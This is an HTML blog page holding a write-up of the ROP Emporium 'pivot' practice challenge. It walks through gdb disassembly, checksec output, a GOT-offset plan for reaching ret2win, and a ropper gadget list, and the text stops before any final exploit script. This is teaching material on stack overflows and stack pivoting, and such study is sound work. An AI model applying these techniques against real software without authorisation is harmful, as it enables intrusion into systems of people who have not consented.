@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>ROP Emporium Pivot Writeup :: Adam Gold — Writing about security and programming</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="This challenge, as most ROP Emporium challenges, requires us to overflow the stack to reach the ret2win function. In order to achieve this, we are going to need to create a stack pivot since there is not enough room in the stack itself.
+Using Ghidra, I spotted these functions - pwnme, ret2win and uselessFunction. Let&amp;rsquo;s start by running the binary:
+pivot by ROP Emporium 64bits Call ret2win() from libpivot.so The Old Gods kindly bestow upon you a place to pivot: 0x7ffff7988f10 Send your second chain now and it will land there &amp;gt; a Now kindly send your stack smash &amp;gt; And then some gdb disassembling:"/>
+<meta name="keywords" content="blog, security, programming, python, developer"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://adamgold.github.io/posts/ropemporium-pivot/" />
+
+
+<base href="https://adamgold.github.io/posts/ropemporium-pivot/">
+<meta name="url" content="https://adamgold.github.io/posts/ropemporium-pivot/" />
+<meta property="og:locale" content="en">
+
+ 
+  <title itemprop="name">ROP Emporium Pivot Writeup | Adam Gold</title>
+  <meta itemprop="name" content="ROP Emporium Pivot Writeup | Adam Gold" />
+  <meta name="description" content="ROP Emporium callenge - [Pivot](https://ropemporium.com/challenge/pivot.html)! This challenge, as most ROP Emporium challenges, requires us to overflow the stack to reach the `ret2win` function. In order to achieve this, we are going to need to create a stack pivot since there is not enough room in the stack itself." />
+  <meta itemprop="description" content="ROP Emporium callenge - [Pivot](https://ropemporium.com/challenge/pivot.html)! This challenge, as most ROP Emporium challenges, requires us to overflow the stack to reach the `ret2win` function. In order to achieve this, we are going to need to create a stack pivot since there is not enough room in the stack itself." />
+  
+  
+  
+
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="https://adamgold.github.io/" />
+  <meta property="article:publisher" content="" /> 
+  <meta property="og:article:published_time" content=2020-01-03T17:06:56&#43;0300 /> 
+  <meta property="article:published_time" content=2020-01-03T17:06:56&#43;0300 />
+  
+  
+  
+  
+
+
+
+<script type="text/javascript" src="/scripts/global.js"></script><script type="application/ld+json">
+	
+	{
+	  "@context": "https://schema.org",
+	  "@type": "BlogPosting",
+	  "headline": "ROP Emporium Pivot Writeup",
+	  "image": "https://adamgold.github.io/",
+	  "datePublished": "2020-01-03T17:06:56+03:00",
+	  "dateModified": "2020-01-03T17:06:56+03:00",
+	  "author": {
+	    "@type": "Person",
+	    "name": "Adam Gold"
+	  },
+	  "mainEntityOfPage": { "@type": "WebPage" },
+	  "description": "This challenge, as most ROP Emporium challenges, requires us to overflow the stack to reach the ret2win function. In order to achieve this, we are going to need to create a stack pivot since there is not enough room in the stack itself.\nUsing Ghidra, I spotted these functions - pwnme, ret2win and uselessFunction. Let\u0026rsquo;s start by running the binary:\npivot by ROP Emporium 64bits Call ret2win() from libpivot.so The Old Gods kindly bestow upon you a place to pivot: 0x7ffff7988f10 Send your second chain now and it will land there \u0026gt; a Now kindly send your stack smash \u0026gt; And then some gdb disassembling:",
+	  "keywords": ["binary-exploitation", "pwning", "rop"]
+	}
+	
+	{
+	  "@context": "https://schema.org",
+	  "@type": "Organization",
+	  "name": "Adam Gold - Writing about security and programming",
+	  "url": "https://adamgold.github.io/",
+	  "sameAs": [
+	    "https://twitter.com/adamgolds",
+	    "https://github.com/adamgold"
+	  ]
+	}
+</script>
+
+
+
+
+<link rel="stylesheet" href="https://adamgold.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://adamgold.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://adamgold.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://adamgold.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ROP Emporium Pivot Writeup"/>
+<meta name="twitter:description" content="ROP Emporium callenge - [Pivot](https://ropemporium.com/challenge/pivot.html)! This challenge, as most ROP Emporium challenges, requires us to overflow the stack to reach the `ret2win` function. In order to achieve this, we are going to need to create a stack pivot since there is not enough room in the stack itself."/>
+
+
+
+<meta property="og:title" content="ROP Emporium Pivot Writeup" />
+<meta property="og:description" content="ROP Emporium callenge - [Pivot](https://ropemporium.com/challenge/pivot.html)! This challenge, as most ROP Emporium challenges, requires us to overflow the stack to reach the `ret2win` function. In order to achieve this, we are going to need to create a stack pivot since there is not enough room in the stack itself." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://adamgold.github.io/posts/ropemporium-pivot/" />
+<meta property="article:published_time" content="2020-01-03T17:06:56+03:00" />
+<meta property="article:modified_time" content="2020-01-03T17:06:56+03:00" /><meta property="og:site_name" content="Adam Gold" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">Adam Gold</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://github.com/AdamGold">GitHub</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/adamgold7/">LinkedIn</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://github.com/AdamGold">GitHub</a></li>
+      
+    
+      
+        <li><a href="https://www.linkedin.com/in/adamgold7/">LinkedIn</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="https://adamgold.github.io/posts/ropemporium-pivot/">ROP Emporium Pivot Writeup</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-01-03
+        </span>
+
+        
+          
+        
+      
+
+      
+      
+        <span class="post-read-time">— 10 min read</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="https://adamgold.github.io/tags/binary-exploitation/">binary-exploitation</a>&nbsp;
+        
+          #<a href="https://adamgold.github.io/tags/pwning/">pwning</a>&nbsp;
+        
+          #<a href="https://adamgold.github.io/tags/rop/">rop</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>This challenge, as most ROP Emporium challenges, requires us to overflow the stack to reach the <code>ret2win</code> function. In order to achieve this, we are going to need to create a stack pivot since there is not enough room in the stack itself.</p>
+<p>Using Ghidra, I spotted these functions - <code>pwnme</code>, <code>ret2win</code> and <code>uselessFunction</code>. Let&rsquo;s start by running the binary:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pivot by ROP Emporium
+64bits
+
+Call ret2win<span style="color:#f92672">()</span> from libpivot.so
+The Old Gods kindly bestow upon you a place to pivot: 0x7ffff7988f10
+Send your second chain now and it will land there
+&gt; a
+Now kindly send your stack smash
+&gt;
+
+</code></pre></div><p>And then some gdb disassembling:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; checksec
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/adamgold/Desktop/ctfs/pivot/pivot&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
+    RPATH:    <span style="color:#e6db74">&#39;./&#39;</span>
+
+pwndbg&gt; disass main
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
+   0x0000000000400996 &lt;+0&gt;:	push   rbp
+   0x0000000000400997 &lt;+1&gt;:	mov    rbp,rsp
+   0x000000000040099a &lt;+4&gt;:	sub    rsp,0x10
+   0x000000000040099e &lt;+8&gt;:	mov    rax,QWORD PTR <span style="color:#f92672">[</span>rip+0x2016db<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x602080 &lt;stdout@@GLIBC_2.2.5&gt;</span>
+   0x00000000004009a5 &lt;+15&gt;:	mov    ecx,0x0
+   0x00000000004009aa &lt;+20&gt;:	mov    edx,0x2
+   0x00000000004009af &lt;+25&gt;:	mov    esi,0x0
+   0x00000000004009b4 &lt;+30&gt;:	mov    rdi,rax
+   0x00000000004009b7 &lt;+33&gt;:	call   0x400870 &lt;setvbuf@plt&gt;
+   0x00000000004009bc &lt;+38&gt;:	mov    rax,QWORD PTR <span style="color:#f92672">[</span>rip+0x2016dd<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x6020a0 &lt;stderr@@GLIBC_2.2.5&gt;</span>
+   0x00000000004009c3 &lt;+45&gt;:	mov    ecx,0x0
+   0x00000000004009c8 &lt;+50&gt;:	mov    edx,0x2
+   0x00000000004009cd &lt;+55&gt;:	mov    esi,0x0
+   0x00000000004009d2 &lt;+60&gt;:	mov    rdi,rax
+   0x00000000004009d5 &lt;+63&gt;:	call   0x400870 &lt;setvbuf@plt&gt;
+   0x00000000004009da &lt;+68&gt;:	mov    edi,0x400b98
+   0x00000000004009df &lt;+73&gt;:	call   0x400800 &lt;puts@plt&gt;
+   0x00000000004009e4 &lt;+78&gt;:	mov    edi,0x400bae
+   0x00000000004009e9 &lt;+83&gt;:	call   0x400800 &lt;puts@plt&gt;
+   0x00000000004009ee &lt;+88&gt;:	mov    edi,0x1000000
+   0x00000000004009f3 &lt;+93&gt;:	call   0x400860 &lt;malloc@plt&gt;
+   0x00000000004009f8 &lt;+98&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rbp-0x8<span style="color:#f92672">]</span>,rax
+   0x00000000004009fc &lt;+102&gt;:	mov    rax,QWORD PTR <span style="color:#f92672">[</span>rbp-0x8<span style="color:#f92672">]</span>
+   0x0000000000400a00 &lt;+106&gt;:	add    rax,0xffff00
+   0x0000000000400a06 &lt;+112&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rbp-0x10<span style="color:#f92672">]</span>,rax
+   0x0000000000400a0a &lt;+116&gt;:	mov    rax,QWORD PTR <span style="color:#f92672">[</span>rbp-0x10<span style="color:#f92672">]</span>
+   0x0000000000400a0e &lt;+120&gt;:	mov    rdi,rax
+   0x0000000000400a11 &lt;+123&gt;:	call   0x400a3b &lt;pwnme&gt;
+   0x0000000000400a16 &lt;+128&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rbp-0x10<span style="color:#f92672">]</span>,0x0
+   0x0000000000400a1e &lt;+136&gt;:	mov    rax,QWORD PTR <span style="color:#f92672">[</span>rbp-0x8<span style="color:#f92672">]</span>
+   0x0000000000400a22 &lt;+140&gt;:	mov    rdi,rax
+   0x0000000000400a25 &lt;+143&gt;:	call   0x4007f0 &lt;free@plt&gt;
+   0x0000000000400a2a &lt;+148&gt;:	mov    edi,0x400bb6
+   0x0000000000400a2f &lt;+153&gt;:	call   0x400800 &lt;puts@plt&gt;
+   0x0000000000400a34 &lt;+158&gt;:	mov    eax,0x0
+   0x0000000000400a39 &lt;+163&gt;:	leave
+   0x0000000000400a3a &lt;+164&gt;:	ret
+End of assembler dump.
+pwndbg&gt; disass pwnme
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> pwnme:
+   0x0000000000400a3b &lt;+0&gt;:	push   rbp
+   0x0000000000400a3c &lt;+1&gt;:	mov    rbp,rsp
+   0x0000000000400a3f &lt;+4&gt;:	sub    rsp,0x30
+   0x0000000000400a43 &lt;+8&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rbp-0x28<span style="color:#f92672">]</span>,rdi
+   0x0000000000400a47 &lt;+12&gt;:	lea    rax,<span style="color:#f92672">[</span>rbp-0x20<span style="color:#f92672">]</span>
+   0x0000000000400a4b &lt;+16&gt;:	mov    edx,0x20
+   0x0000000000400a50 &lt;+21&gt;:	mov    esi,0x0
+   0x0000000000400a55 &lt;+26&gt;:	mov    rdi,rax
+   0x0000000000400a58 &lt;+29&gt;:	call   0x400820 &lt;memset@plt&gt;
+   0x0000000000400a5d &lt;+34&gt;:	mov    edi,0x400bc0
+   0x0000000000400a62 &lt;+39&gt;:	call   0x400800 &lt;puts@plt&gt;
+   0x0000000000400a67 &lt;+44&gt;:	mov    rax,QWORD PTR <span style="color:#f92672">[</span>rbp-0x28<span style="color:#f92672">]</span>
+   0x0000000000400a6b &lt;+48&gt;:	mov    rsi,rax
+   0x0000000000400a6e &lt;+51&gt;:	mov    edi,0x400be0
+   0x0000000000400a73 &lt;+56&gt;:	mov    eax,0x0
+   0x0000000000400a78 &lt;+61&gt;:	call   0x400810 &lt;printf@plt&gt;
+   0x0000000000400a7d &lt;+66&gt;:	mov    edi,0x400c20
+   0x0000000000400a82 &lt;+71&gt;:	call   0x400800 &lt;puts@plt&gt;
+   0x0000000000400a87 &lt;+76&gt;:	mov    edi,0x400c52
+   0x0000000000400a8c &lt;+81&gt;:	mov    eax,0x0
+   0x0000000000400a91 &lt;+86&gt;:	call   0x400810 &lt;printf@plt&gt;
+   0x0000000000400a96 &lt;+91&gt;:	mov    rdx,QWORD PTR <span style="color:#f92672">[</span>rip+0x2015f3<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x602090 &lt;stdin@@GLIBC_2.2.5&gt;</span>
+   0x0000000000400a9d &lt;+98&gt;:	mov    rax,QWORD PTR <span style="color:#f92672">[</span>rbp-0x28<span style="color:#f92672">]</span>
+   0x0000000000400aa1 &lt;+102&gt;:	mov    esi,0x100
+   0x0000000000400aa6 &lt;+107&gt;:	mov    rdi,rax
+   0x0000000000400aa9 &lt;+110&gt;:	call   0x400840 &lt;fgets@plt&gt;
+   0x0000000000400aae &lt;+115&gt;:	mov    edi,0x400c58
+   0x0000000000400ab3 &lt;+120&gt;:	call   0x400800 &lt;puts@plt&gt;
+   0x0000000000400ab8 &lt;+125&gt;:	mov    edi,0x400c52
+   0x0000000000400abd &lt;+130&gt;:	mov    eax,0x0
+   0x0000000000400ac2 &lt;+135&gt;:	call   0x400810 &lt;printf@plt&gt;
+   0x0000000000400ac7 &lt;+140&gt;:	mov    rdx,QWORD PTR <span style="color:#f92672">[</span>rip+0x2015c2<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x602090 &lt;stdin@@GLIBC_2.2.5&gt;</span>
+   0x0000000000400ace &lt;+147&gt;:	lea    rax,<span style="color:#f92672">[</span>rbp-0x20<span style="color:#f92672">]</span>
+   0x0000000000400ad2 &lt;+151&gt;:	mov    esi,0x40
+   0x0000000000400ad7 &lt;+156&gt;:	mov    rdi,rax
+   0x0000000000400ada &lt;+159&gt;:	call   0x400840 &lt;fgets@plt&gt;
+   0x0000000000400adf &lt;+164&gt;:	nop
+   0x0000000000400ae0 &lt;+165&gt;:	leave
+   0x0000000000400ae1 &lt;+166&gt;:	ret
+End of assembler dump.
+pwndbg&gt; disass uselessFunction
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> uselessFunction:
+   0x0000000000400ae2 &lt;+0&gt;:	push   rbp
+   0x0000000000400ae3 &lt;+1&gt;:	mov    rbp,rsp
+   0x0000000000400ae6 &lt;+4&gt;:	mov    eax,0x0
+   0x0000000000400aeb &lt;+9&gt;:	call   0x400850 &lt;foothold_function@plt&gt;
+   0x0000000000400af0 &lt;+14&gt;:	mov    edi,0x1
+   0x0000000000400af5 &lt;+19&gt;:	call   0x400880 &lt;exit@plt&gt;
+End of assembler dump.
+
+</code></pre></div><p>NX enabled, meaning we can not execute nothing on the stack. We have two stages of shellcode (also can be seen when running the binary) - First one uses <code>fgets</code> and stores the input on previously allocated buffer, and the second one is vulnerable to buffer overflow.</p>
+<p>From the <code>uselessFunction</code> disassembly, we can see that it just calls the <code>foothold_function</code> from <code>libpivot.so</code>. But <code>uselessFunction</code> isn’t called anywhere in the code, so in order to populate the <code>.got.plt</code> entry, we have to first call the <code>foothold_function</code>.</p>
+<p>Let&rsquo;s design a basic plan:</p>
+<ul>
+<li>Call the foothold_function to populate the .got.plt entry.</li>
+<li>Add the offset between <code>ret2win</code> to <code>foothold_function</code> to get our <code>ret2win</code> function.</li>
+<li>Call it.</li>
+</ul>
+<p>Let&rsquo;s get the <code>ret2win</code> and <code>foothold_function</code> addresses:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adamgold@adamgold-VirtualBox:~/Desktop/CTFs/pivot$ objdump -d ./libpivot.so  | grep ret2win
+
+0000000000000abe :
+
+adamgold@adamgold-VirtualBox:~/Desktop/CTFs/pivot$ objdump -d ./libpivot.so  | grep foothold_function
+
+<span style="color:#ae81ff">0000000000000970</span> :
+</code></pre></div><p>The offset:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; p/x 0x0000000000000abe - 0x0000000000000970
+$2 <span style="color:#f92672">=</span> 0x14e
+</code></pre></div><p>And the .got.plt address of <code>foothold_function</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Relocation section <span style="color:#e6db74">&#39;.rela.plt&#39;</span> at offset 0x6c8 contains <span style="color:#ae81ff">10</span> entries:
+
+  Offset          Info           Type           Sym. Value    Sym. Name + Addend
+
+000000602018  <span style="color:#ae81ff">000100000007</span> R_X86_64_JUMP_SLO <span style="color:#ae81ff">0000000000000000</span> free@GLIBC_2.2.5 + <span style="color:#ae81ff">0</span>
+
+000000602020  <span style="color:#ae81ff">000300000007</span> R_X86_64_JUMP_SLO <span style="color:#ae81ff">0000000000000000</span> puts@GLIBC_2.2.5 + <span style="color:#ae81ff">0</span>
+
+000000602028  <span style="color:#ae81ff">000400000007</span> R_X86_64_JUMP_SLO <span style="color:#ae81ff">0000000000000000</span> printf@GLIBC_2.2.5 + <span style="color:#ae81ff">0</span>
+
+000000602030  <span style="color:#ae81ff">000500000007</span> R_X86_64_JUMP_SLO <span style="color:#ae81ff">0000000000000000</span> memset@GLIBC_2.2.5 + <span style="color:#ae81ff">0</span>
+
+000000602038  <span style="color:#ae81ff">000600000007</span> R_X86_64_JUMP_SLO <span style="color:#ae81ff">0000000000000000</span> __libc_start_main@GLIBC_2.2.5 + <span style="color:#ae81ff">0</span>
+
+000000602040  <span style="color:#ae81ff">000700000007</span> R_X86_64_JUMP_SLO <span style="color:#ae81ff">0000000000000000</span> fgets@GLIBC_2.2.5 + <span style="color:#ae81ff">0</span>
+
+000000602048  <span style="color:#ae81ff">000900000007</span> R_X86_64_JUMP_SLO <span style="color:#ae81ff">0000000000000000</span> foothold_function + <span style="color:#ae81ff">0</span>
+
+000000602050  000a00000007 R_X86_64_JUMP_SLO <span style="color:#ae81ff">0000000000000000</span> malloc@GLIBC_2.2.5 + <span style="color:#ae81ff">0</span>
+
+000000602058  000b00000007 R_X86_64_JUMP_SLO <span style="color:#ae81ff">0000000000000000</span> setvbuf@GLIBC_2.2.5 + <span style="color:#ae81ff">0</span>
+
+000000602060  000d00000007 R_X86_64_JUMP_SLO <span style="color:#ae81ff">0000000000000000</span> exit@GLIBC_2.2.5 + <span style="color:#ae81ff">0</span>
+</code></pre></div><h3 id="gadget-hunt">Gadget Hunt</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adamgold@adamgold-VirtualBox:~/Desktop/ctfs/pivot$ ropper --file pivot
+<span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Load gadgets from cache
+<span style="color:#f92672">[</span>LOAD<span style="color:#f92672">]</span> loading... 100%
+<span style="color:#f92672">[</span>LOAD<span style="color:#f92672">]</span> removing double gadgets... 100%
+
+
+
+Gadgets
+<span style="color:#f92672">=======</span>
+
+
+0x0000000000400b7f: add bl, dh; ret;
+0x0000000000400984: add byte ptr <span style="color:#f92672">[</span>rax - 0x7b<span style="color:#f92672">]</span>, cl; sal byte ptr <span style="color:#f92672">[</span>rcx + rsi*8 + 0x55<span style="color:#f92672">]</span>, 0x48; mov ebp, esp; call rax;
+0x0000000000400b7d: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; add bl, dh; ret;
+0x0000000000400982: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; add byte ptr <span style="color:#f92672">[</span>rax - 0x7b<span style="color:#f92672">]</span>, cl; sal byte ptr <span style="color:#f92672">[</span>rcx + rsi*8 + 0x55<span style="color:#f92672">]</span>, 0x48; mov ebp, esp; call rax;
+0x0000000000400b7b: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; add bl, dh; ret;
+0x00000000004008fc: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; pop rbp; ret;
+0x0000000000400a35: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; leave; ret;
+0x0000000000400a36: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; add cl, cl; ret;
+0x00000000004007cb: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; add rsp, 8; ret;
+0x0000000000400af3: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; call 0x880; nop word ptr <span style="color:#f92672">[</span>rax + rax<span style="color:#f92672">]</span>; pop rax; ret;
+0x0000000000400ad5: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; mov rdi, rax; call 0x840; nop; leave; ret;
+0x0000000000400afe: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; pop rax; ret;
+0x00000000004008fe: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; pop rbp; ret;
+0x0000000000400b82: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; sub rsp, 8; add rsp, 8; ret;
+0x00000000004008e8: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; test rax, rax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400936: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; test rax, rax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400983: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; test rax, rax; je 0x97b; push rbp; mov rbp, rsp; call rax;
+0x0000000000400a37: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; leave; ret;
+0x0000000000400afd: add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, r8b; pop rax; ret;
+0x0000000000400a38: add cl, cl; ret;
+0x0000000000400af1: add dword ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, eax; add byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; call 0x880; nop word ptr <span style="color:#f92672">[</span>rax + rax<span style="color:#f92672">]</span>; pop rax; ret;
+0x0000000000400964: add eax, 0x20173e; add ebx, esi; ret;
+0x0000000000400b0a: add eax, ebp; ret;
+0x0000000000400969: add ebx, esi; ret;
+0x00000000004007ce: add esp, 8; ret;
+0x0000000000400b09: add rax, rbp; ret;
+0x00000000004007cd: add rsp, 8; ret;
+0x00000000004008f2: and byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, ah; jmp rax;
+0x0000000000400967: and byte ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>, al; add ebx, esi; ret;
+0x0000000000400a25: call 0x7f0; mov edi, 0x400bb6; call 0x800; mov eax, 0; leave; ret;
+0x0000000000400a2f: call 0x800; mov eax, 0; leave; ret;
+0x0000000000400ada: call 0x840; nop; leave; ret;
+0x0000000000400aeb: call 0x850; mov edi, 1; call 0x880; nop word ptr <span style="color:#f92672">[</span>rax + rax<span style="color:#f92672">]</span>; pop rax; ret;
+0x0000000000400af5: call 0x880; nop word ptr <span style="color:#f92672">[</span>rax + rax<span style="color:#f92672">]</span>; pop rax; ret;
+0x0000000000400995: call qword ptr <span style="color:#f92672">[</span>rbp + 0x48<span style="color:#f92672">]</span>;
+0x000000000040098e: call rax;
+0x0000000000400ca3: call rsp;
+0x0000000000400b5c: fmul qword ptr <span style="color:#f92672">[</span>rax - 0x7d<span style="color:#f92672">]</span>; ret;
+0x00000000004008ed: je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
+0x000000000040093b: je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400988: je 0x97b; push rbp; mov rbp, rsp; call rax;
+0x0000000000400d9b: jmp qword ptr <span style="color:#f92672">[</span>rbp<span style="color:#f92672">]</span>;
+0x0000000000400d5b: jmp qword ptr <span style="color:#f92672">[</span>rdi<span style="color:#f92672">]</span>;
+0x0000000000400af9: jmp qword ptr <span style="color:#f92672">[</span>rsi + 0xf<span style="color:#f92672">]</span>;
+0x00000000004008f5: jmp rax;
+0x0000000000400961: lcall <span style="color:#f92672">[</span>rbp - 0x3a<span style="color:#f92672">]</span>; add eax, 0x20173e; add ebx, esi; ret;
+0x0000000000400a34: mov eax, 0; leave; ret;
+0x0000000000400b06: mov eax, dword ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>; ret;
+0x000000000040098c: mov ebp, esp; call rax;
+0x0000000000400a2a: mov edi, 0x400bb6; call 0x800; mov eax, 0; leave; ret;
+0x00000000004008f0: mov edi, 0x602078; jmp rax;
+0x0000000000400af0: mov edi, 1; call 0x880; nop word ptr <span style="color:#f92672">[</span>rax + rax<span style="color:#f92672">]</span>; pop rax; ret;
+0x0000000000400ad8: mov edi, eax; call 0x840; nop; leave; ret;
+0x0000000000400ad2: mov esi, 0x40; mov rdi, rax; call 0x840; nop; leave; ret;
+0x0000000000400b05: mov rax, qword ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>; ret;
+0x000000000040098b: mov rbp, rsp; call rax;
+0x0000000000400ad7: mov rdi, rax; call 0x840; nop; leave; ret;
+0x0000000000400afb: nop dword ptr <span style="color:#f92672">[</span>rax + rax<span style="color:#f92672">]</span>; pop rax; ret;
+0x00000000004008f8: nop dword ptr <span style="color:#f92672">[</span>rax + rax<span style="color:#f92672">]</span>; pop rbp; ret;
+0x0000000000400945: nop dword ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>; pop rbp; ret;
+0x0000000000400afa: nop word ptr <span style="color:#f92672">[</span>rax + rax<span style="color:#f92672">]</span>; pop rax; ret;
+0x00000000004008f7: nop word ptr <span style="color:#f92672">[</span>rax + rax<span style="color:#f92672">]</span>; pop rbp; ret;
+0x0000000000400a2c: or eax, dword ptr <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>; call 0x800; mov eax, 0; leave; ret;
+0x0000000000400b6c: pop r12; pop r13; pop r14; pop r15; ret;
+0x0000000000400b6e: pop r13; pop r14; pop r15; ret;
+0x0000000000400b70: pop r14; pop r15; ret;
+0x0000000000400b72: pop r15; ret;
+0x0000000000400b00: pop rax; ret;
+0x00000000004008ef: pop rbp; mov edi, 0x602078; jmp rax;
+0x0000000000400b6b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
+0x0000000000400b6f: pop rbp; pop r14; pop r15; ret;
+0x0000000000400900: pop rbp; ret;
+0x0000000000400b73: pop rdi; ret;
+0x0000000000400b71: pop rsi; pop r15; ret;
+0x0000000000400b6d: pop rsp; pop r13; pop r14; pop r15; ret;
+0x000000000040098a: push rbp; mov rbp, rsp; call rax;
+0x0000000000400aca: ret 0x2015;
+0x0000000000400987: sal byte ptr <span style="color:#f92672">[</span>rcx + rsi*8 + 0x55<span style="color:#f92672">]</span>, 0x48; mov ebp, esp; call rax;
+0x0000000000400b85: sub esp, 8; add rsp, 8; ret;
+0x0000000000400b84: sub rsp, 8; add rsp, 8; ret;
